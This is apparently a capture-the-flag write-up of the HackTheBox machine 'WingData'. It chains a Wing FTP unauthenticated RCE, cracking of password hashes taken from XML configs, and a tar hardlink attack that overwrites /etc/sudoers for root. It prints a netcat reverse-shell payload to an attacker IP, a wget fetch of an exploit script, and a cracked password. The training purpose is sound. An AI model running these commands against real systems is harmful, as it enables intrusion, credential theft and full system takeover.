---
title: "HackTheBox — WingData (Linux / Easy)"
date: 2026-08-07 02:20:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, cve-2025-47812, cve-2025-4517, wing-ftp, rce, hashcat, sha256, credential-harvesting, ssh, tar-injection, sudo-abuse, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **When an FTP web client hands out reverse shells without authentication and a backup restore script blindly extracts tar archives as root.**  
> This is the story of WingData — an easy-difficulty Linux machine that chains unauthenticated RCE in Wing FTP Server, credential harvesting from XML configurations, offline hash cracking, and a malicious tar injection via a sudo-allowed backup script to achieve full root compromise.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | WingData                     |
| OS           | Linux                        |
| Difficulty   | Easy                         |
| Techniques   | CVE-2025-47812 (Wing FTP unauthenticated RCE), XML credential harvesting, SHA256 hash cracking (Hashcat mode 1410), CVE-2025-4517 (tar symlink/hardlink injection via backup script) |
| Tools Used   | nmap, ffuf, netcat, python3, hashcat, sshpass, ssh, wget |

---

## 🕚 11:00 — Reconnaissance & Enumeration

Start with an Nmap scan to identify open ports and services:

```bash
$ nmap -sCV -A <TARGET_IP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 (Debian)
80/tcp open  http    Apache httpd 2.4.66 (redirecting to http://wingdata.htb/)
```

Many ports filtered → firewall active. The web server uses virtual hosting, so add the domains to `/etc/hosts`:

```bash
$ echo "<TARGET_IP> wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

## 🕦 11:30 — Web Enumeration

### Main Site (wingdata.htb)

Browsing the site reveals a corporate landing page. In the navigation bar, clicking **Client Portal** redirects to `ftp.wingdata.htb`.

### Directory Fuzzing

```bash
$ ffuf -u http://wingdata.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
```

Notable results: `/assets` (301), `/vendor` (301), `.htaccess` (403), `.htpasswd` (403).

The `/vendor` directory suggests a PHP application with third-party libraries.

### FTP Web Client (ftp.wingdata.htb)

Visiting `http://ftp.wingdata.htb` shows a login page for **Wing FTP Server Web Client**. At the bottom, the exact version is disclosed: **Wing FTP Server v7.4.3**.

---

## 🕛 12:00 — Initial Foothold: CVE-2025-47812 (Unauthenticated RCE)

Research reveals that Wing FTP Server 7.4.3 is vulnerable to **CVE-2025-47812**, an unauthenticated remote code execution flaw.

### Acquire the Exploit

Clone the Proof-of-Concept:

```bash
$ git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
$ cd CVE-2025-47812-poc
```

### Set Up a Listener

```bash
$ nc -lvnp 5555
```

### Run the Exploit

```bash
$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc <ATTACKER_IP> 5555 -e /bin/sh" -v
```

The script sends a crafted request, obtains a valid session UID, and triggers command execution. Your netcat listener receives a connection as user **wingftp**.

### Upgrade the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 🕧 12:30 — Post-Exploitation: Credential Discovery

As `wingftp`, explore the system.

### Home Directories

```bash
wingftp@wingdata:~$ cd /home && ls -la
```

Two users exist: `wingftp` and **wacky**. Attempting to enter `wacky`'s folder fails with "Permission denied".

### Wing FTP Server Configuration

Navigate to the FTP user data directory:

```bash
wingftp@wingdata:~$ cd /opt/wftpserver/Data/1/users && ls
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

Read `wacky.xml`:

```bash
wingftp@wingdata:~$ cat wacky.xml
```

Inside, find the password hash for the `wacky` account:

```
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

---

## 🕐 13:00 — Hash Cracking: Recovering `wacky`'s Password

Wing FTP Server hashes passwords as `SHA256(password + lowercase(username))`. The **salt is the lowercase username itself** (i.e., `wacky`), **not** the string "WingFTP".

### Prepare the Hash for Hashcat

```bash
$ echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:wacky' > hash.txt
```

### Crack with Hashcat

Mode `1410` corresponds to `sha256($pass.$salt)`:

```bash
$ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat quickly recovers the password: **`!#7Blushing^*Bride5`**

---

## 🕜 13:30 — Lateral Movement: SSH as `wacky`

Use the recovered password to SSH into the machine:

```bash
$ sshpass -p '!#7Blushing^*Bride5' ssh -o StrictHostKeyChecking=no wacky@<TARGET_IP>
```

Retrieve the user flag:

```bash
wacky@wingdata:~$ cat ~/user.txt
<REDACTED>
```

**User flag captured! 🎉**

---

## 🕑 14:00 — Privilege Escalation Enumeration

Check `wacky`'s sudo privileges:

```bash
wacky@wingdata:~$ sudo -l
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

This means `wacky` can execute the `restore_backup_clients.py` script as root **without a password**, and can pass arbitrary arguments (because of the `*` wildcard).

### Analyze the Backup Script

```bash
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
```

Key observations:
- It restores `.tar` archives from `/opt/backup_clients/backups`
- Extraction is done with `tarfile.extractall(…, filter="data")` **as root**
- Validation is limited to basic filename checks
- By crafting a malicious tar archive, we can overwrite system files (e.g., `/etc/sudoers`)

This is the core of **CVE-2025-4517**.

---

## 🕝 14:30 — Privilege Escalation: CVE-2025-4517 (Tar Injection)

### Transfer the Exploit to the Target

**On Kali:**

```bash
$ git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
$ cd CVE-2025-4517-POC-HTB-WingData
$ python3 -m http.server 80
```

> **Important:** The server must be started in the folder that contains `CVE-2025-4517-POC.py`. Common mistake: running the server from the previous CVE-2025-47812 folder — it will return 404.

**On target (as `wacky`):**

```bash
wacky@wingdata:~$ cd /tmp
wacky@wingdata:/tmp$ wget http://<ATTACKER_IP>/CVE-2025-4517-POC.py
```

### Run the Exploit

```bash
wacky@wingdata:/tmp$ python3 /tmp/CVE-2025-4517-POC.py
```

The script will:
- Create a specially crafted tar archive with symlinks and a hardlink to `/etc/sudoers`
- Inject a malicious sudoers entry: `wacky ALL=(ALL) NOPASSWD: ALL`
- Place the archive in the legitimate backup directory
- Trigger the vulnerable restore script as root
- Prompt you to spawn a root shell

When asked to spawn a root shell, type **y** and then execute:

```bash
wacky@wingdata:~$ sudo /bin/bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 🕞 15:00 — Root Flag

```bash
# cat /root/root.txt
<REDACTED>
```

**Rooted! 🏆**

---

## The Fundamentals Behind the Box

WingData is a compact, linear kill-chain that teaches the full penetration testing workflow — from initial discovery through credential harvesting and hash cracking to privilege escalation via archive injection. Each stage builds upon the previous one and mirrors mistakes that appear regularly in real production environments.

This section breaks down the core fundamental mechanisms that make each step possible.

### 1. Enumeration Beyond Port Scanning

- **Virtual host / subdomain discovery** — The web application uses name-based virtual hosting (`wingdata.htb`, `ftp.wingdata.htb`). Ignoring this would leave you blind. Always add discovered hostnames to `/etc/hosts`.
- **Service version banners** — The FTP web client openly displays `Wing FTP Server v7.4.3`. Version disclosure is often the first step toward finding a known vulnerability.
- **Directory fuzzing** — Using tools like `ffuf` reveals hidden content (`/vendor`, `.htaccess`) that hints at the application stack.

**Fundamental lesson:** Reconnaissance goes far beyond `nmap`. Virtual hosts, version banners, and hidden directories are often the keys to initial access.

### 2. Vulnerability Research & Exploitation (CVE-2025-47812)

CVE-2025-47812 teaches that **unauthenticated services** (like the FTP web portal) can be the weakest link. The exploit chains a session-UID leak with a command injection, granting a reverse shell as the service account.

**Fundamental lesson:** Always research discovered software versions against public CVE databases. Unauthenticated RCE is the highest-value finding.

### 3. Post-Exploitation & Credential Harvesting

As `wingftp`, we couldn't access other users' home directories — the principle of **least privilege** was enforced. However, the Wing FTP Server stores user passwords as hashes in XML files (`/opt/wftpserver/Data/1/users/*.xml`).

**Fundamental lesson:** Configuration file mining is a critical post-exploitation technique. Sensitive data should never be world-readable, even on a hardened system.

### 4. Password Cracking Theory

The hash was `SHA256(password + lowercase(username))`. Understanding the correct hash mode (1410) and salt format was critical. A common mistake is using "WingFTP" as the salt instead of the actual username (`wacky`).

**Fundamental lesson:** Salt values are application-specific. Always research the target application's hashing algorithm before cracking. Hashcat mode selection is everything.

### 5. Lateral Movement via Credential Reuse

Once the plaintext password was recovered, we pivoted from the low-privilege `wingftp` account to the legitimate user `wacky` via SSH.

**Fundamental lesson:** Credential reuse across different services (FTP → SSH) is extremely common and often the easiest lateral movement vector.

### 6. Privilege Escalation via Sudo Misconfiguration

The `sudo -l` output revealed that `wacky` could run a Python script as root without a password with a wildcard (`*`) for arguments. The script extracted tar archives **as root** with minimal validation.

**Fundamental lesson:** `sudo -l` is always the first privilege escalation check. Wildcard arguments and scripts that process untrusted input as root are classic escalation vectors.

### 7. Insecure Archive Extraction (CVE-2025-4517)

Even with `filter="data"`, a crafted tar can place symlinks and hardlinks that point to files outside the extraction directory. By creating a hardlink to `/etc/sudoers`, the exploit **overwrites** the system's sudo policy.

**Fundamental lesson:** Never extract untrusted archives with elevated privileges. Even "filtered" extractions may be bypassed via symlink/hardlink attacks.

---

## Summary of Fundamentals

| Concept | How It Appears in WingData |
|---------|-----------------------------|
| Virtual host enumeration | `wingdata.htb` + `ftp.wingdata.htb` discovery |
| Version banner → CVE research | Wing FTP v7.4.3 → CVE-2025-47812 |
| Unauthenticated RCE | Session-UID leak + command injection |
| XML credential harvesting | Password hashes in `/opt/wftpserver/Data/1/users/*.xml` |
| Hash cracking with correct salt | SHA256(pass + lowercase(username)), Hashcat mode 1410 |
| Credential reuse (lateral movement) | FTP password → SSH access |
| Sudo misconfiguration | `NOPASSWD` on script with wildcard args |
| Tar symlink/hardlink injection | CVE-2025-4517 overwrites `/etc/sudoers` |

---

## Vulnerability Summary

| Stage | Vulnerability / Misconfiguration | Impact |
|-------|----------------------------------|--------|
| **Foothold** | CVE-2025-47812 (Wing FTP unauthenticated RCE) | Reverse shell as `wingftp` |
| **Credential Harvesting** | World-readable XML config with SHA256 password hash | Password cracked offline |
| **Lateral Movement** | Credential reuse across FTP and SSH | Access as `wacky` |
| **Escalation** | CVE-2025-4517 (malicious tar injection via backup script) | Full root via sudoers overwrite |

---

## Key Takeaways

1. **Remove version banners** from production services — they directly enable CVE research.
2. **Use strong, per-service passwords** — credential reuse enabled lateral movement from `wingftp` to `wacky`.
3. **Audit sudo rules carefully** — `NOPASSWD` on scripts that accept untrusted input is a direct path to root.
4. **Sanitize archive extraction** — use safer APIs or chroot/jail environments when handling external archives as root.
5. **Regularly patch software** — Wing FTP 7.4.3 had both an RCE and a post-exploitation vulnerability that were publicly known.

---

## Troubleshooting Common Pitfalls

- **"Permission denied" when entering `/home/wacky`**: Normal — you must first gain SSH access as `wacky`.
- **Hashcat shows "Exhausted"**: Check the salt — it should be the username (`wacky`), not "WingFTP".
- **`wget` returns 404**: Ensure the HTTP server is running in the directory that actually contains `CVE-2025-4517-POC.py`, not the earlier exploit folder.
- **`wget` downloads `index.html` instead of the `.py` file**: You probably put a space after the IP. Use the full URL `http://IP/filename.py` without breaks.
